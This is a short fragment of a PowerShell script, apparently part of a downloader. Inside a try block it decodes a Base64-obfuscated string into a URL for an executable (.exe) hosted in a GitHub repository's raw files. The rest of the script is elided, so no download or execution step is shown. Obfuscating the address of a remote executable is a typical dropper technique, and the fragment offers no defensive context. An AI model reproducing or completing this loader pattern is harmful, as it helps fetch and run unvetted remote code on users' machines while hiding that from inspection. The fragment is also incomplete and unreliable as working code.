...
try {
    ...
    # O
    $download_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL0FUS0FSSVNJNzYvMzEvcmF3L3JlZnMvaGVhZHMvbWFpbi81LjZNb2NrYS5leGU='))
